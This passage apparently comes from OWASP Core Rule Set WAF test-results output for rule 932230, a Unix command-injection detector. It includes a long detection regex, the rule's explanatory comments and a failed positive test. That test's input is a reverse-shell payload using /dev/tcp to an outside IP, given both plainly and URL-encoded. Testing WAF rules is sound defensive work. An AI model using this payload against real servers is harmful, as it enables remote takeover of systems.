\.0-9A-Z_a-z][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?){1,10}(?:[\\s\\x0b&\\),<>\\|\\}]|$){1,10})|r[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?j[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[\\s\\x0b&\\),<>\\|]|$).*)|g[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:(?:[&\\),<>\\|]|$){1,10}|(?:[\\-\\.0-9A-Z_a-z][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?){1,10}(?:[\\s\\x0b&\\),<>\\|\\}]|$){1,10})|(?:d[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?b|[hr][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c|p[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?g)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[\\s\\x0b&\\),<>\\|]|$).*))\\b"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932230
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Unix Command Injection (2-3 chars)"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-unix"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932230",
    "test_id" : 36,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932230.yaml",
    "description" : "Positive test - BB BBBZARPI - d=/dev&&(sh)0>$d/tcp/51.15.142.164/777",
    "cause" : "failed expect_id check: 932230 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=932250 - Remote Command Execution: Direct Unix Command Execution", "phase=2 rule_id=932236 - Remote Command Execution: Unix Command Injection (command without evasion)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 36,
      "desc" : "Positive test - BB BBBZARPI - d=/dev&&(sh)0>$d/tcp/51.15.142.164/777",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip, deflate, br",
            "Accept-Language" : "en-us,en;q=0.5"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?cmd=d%3D%2Fdev%26%26(sh)0%3E%24d%2Ftcp%2F51.15.142.164%2F777",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932230 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932230,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Unix command injection ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Unix command injections."
        }, {
          "type" : "Comment",
          "text" : " A command injection takes a form such as:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   foo.jpg;uname -a"
        }, {
          "type" : "Comment",
          "text" : "   foo.jpg||uname -a"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The vulnerability exists when an application executes a shell command"
        }, {
          "type" : "Comment",
          "text" : " without proper input escaping/validation."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule is also triggered by an Oracle WebLogic Remote Command Execution exploit:"
        }, {
          "type" : "Comment",
          "text" : " [ Oracle WebLogic vulnerability CVE-2017-10271 - Exploit tested: https://www.exploit-db.com/exploits/43458 ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " To prevent false positives, we look for a 'starting sequence' that"
        }, {
          "type" : "Comment",
          "text" : " precedes a command in shell syntax, such as: ; | & $( ` <( >("
        }, {
          "type" : "Comment",
          "text" : " Anatomy of the regexp with examples of patterns caught:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " 1. Starting tokens"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " ;        ;ifconfig"
        }, {
          "type" : "Comment",
          "text" : " \\{       {ifconfig}"
        }, {
          "type" : "Comment",
          "text" : " \\|       |ifconfig"
        }, {
          "type" : "Comment",
          "text" : " \\|\\|     ||ifconfig"
        }, {
          "type" : "Comment",
          "text" : " &        &ifconfig"
        }, {
          "type" : "Comment",
          "text" : " &&       &&ifconfig"
        }, {
          "type" : "Comment",
          "text" : " \\n       ;\\nifconfig"
        }, {
          "type" : "Comment",
          "text" : " \\r       ;\\rifconfig"
        }, {
          "type" : "Comment",
          "text" : " \\$\\(     $(ifconfig)"
        }, {
          "type" : "Comment",
          "text" : " \\$\\(\\(   $((ifconfig))"
        }, {
          "type" : "Comment",
          "text" : " \\$\\[     $[2+2]"
        }, {
          "type" : "Comment",
          "text" : " `        `ifconfig`"
        }, {
          "type" : "Comment",
          "text" : " \\${      ${ifconfig}"
        }, {
          "type" : "Comment",
          "text" : " <\\(      <( ifconfig )"
        }, {
          "type" : "Comment",
          "text" : " >\\(      >( ifconfig )"
        }, {
          "type" : "Comment",
          "text" : " \\(\\s*\\)  a() ( ifconfig; ); a"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " 2. Command prefixes"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " {        { ifconfig }"
        }, {
          "type" : "Comment",
          "text" : " \\s*\\(\\s* ( ifconfig )"
        }, {
          "type" : "Comment",
          "text" : " \\w+=(?:[^\\s]*|\\$.*|\\$.*|<.*|>.*|\\'.*\\'|\\\".*\\\")\\s+   VARNAME=xyz ifconfig"
        }, {
          "type" : "Comment",
          "text" : " !\\s*     ! ifconfig"
        }, {
          "type" : "Comment",
          "text" : " \\$       $ifconfig"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " 3. Quoting"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " '        'ifconfig'"
        }, {
          "type" : "Comment",
          "text" : " \\\"       \"ifconfig\""
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " 4. Paths"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " [\\?\\*\\[\\]\\(\\)\\-\\|+\\w'\\\"\\./\\x5c]+/   /sbin/ifconfig, /s?in/./ifconfig, /s[a-b]in/ifconfig etc."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " An effort was made to combat evasions by shell quoting (e.g. 'ls',"
        }, {
          "type" : "Comment",
          "text" : " 'l'\"s\", \\l\\s are all valid). ModSecurity has a t:cmdLine"
        }, {
          "type" : "Comment",
          "text" : " transformation built-in to deal with this, but unfortunately, it"
        }, {
          "type" : "Comment",
          "text" : " replaces ';' characters and lowercases the payload, which is less"
        }, {
          "type" : "Comment",
          "text" : " useful for this case. However, emulating the transformation makes"
        }, {
          "type" : "Comment",
          "text" : " the regexp more complex."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This is the base Rule to prevent Unix Command Injection"
        }, {
          "type" : "Comment",
          "text" : " for prefix + two and three characters."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule relations:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932230 (base rule, PL1, targets prefix + two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  ..932231 (stricter sibling, PL2, targets prefix + the source shortcut command)"
        }, {
          "type" : "Comment",
          "text" : "  ..932232 (stricter sibling, PL3, targets prefix + additional command words)"
        }, {
          "type" : "Comment",
          "text" : "  .932235 (base rule, PL1, targets prefix + known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932250 (base rule, PL1, targets two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  .932260 (base rule, PL1, targets known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932240 (generic detection, PL2, targets generic evasion attempts)"
        }, {
          "type" : "Comment",
          "text" : "  .932236 (stricter sibling of 932230, 932235, 932250, 932260, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length)"
        }, {
          "type" : "Comment",
          "text" : "  ..932239 (sibling of 932236, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : "  ..932238 (stricter sibling of 932236, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - no excluded words)"
        }, {
          "type" : "Comment",
          "text" : "  .932237 (stricter sibling of 932230, 932235, 932250, 932260, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - with word boundaries"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932230.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932230"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?y[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?x|(?:c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d|e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?v|v[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?l)|w[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[\\s\\x0b&\\),<>\\|]|$).*|[ls][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?r[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?e|n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p|t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?i[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:(?:[\\s\\x0b&\\),<>\\|]|$).*|o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t)|[\\n\\r;=`\\{]|\\|\\|?|&&?|\\$(?:\\(\\(?|[\\[\\{])|<(?:\\(|<<)|>\\(|\\([\\s\\x0b]*\\))[\\s\\x0b]*(?:[\\$\\{]|(?:[\\s\\x0b]*\\(|!)[\\s\\x0b]*|[0-9A-Z_a-z]+=(?:[^\\s\\x0b]*|\\$(?:.*|.*)|[<>].*|'[^']*'|\\\"[^\\\"]*\\\")[\\s\\x0b]+)*[\\s\\x0b]*[\\\"']*(?:[\\\"'-\\+\\--9\\?A-\\]_a-z\\|]+/)?[\\\"'\\x5c]*(?:(?:7[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?z[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[arx][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?)?|(?:b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?z[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?z|c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[89][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?9|m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p|s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h)|d[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?)?f|e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?v|q[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?n|s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h)|f[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[dg]|m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t)|(?:h[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u|u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p|i[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?r[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?b|j[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:j[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?s|q)|[kz][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h|m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?r|p[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:d[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?b|k[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?g|t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?x|x[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?z)|r[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p|m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t)|s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p|e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d|(?:s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?)?h|v[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?n)|t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c|b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?l)|w[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:3[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m|c)|x[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:x[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\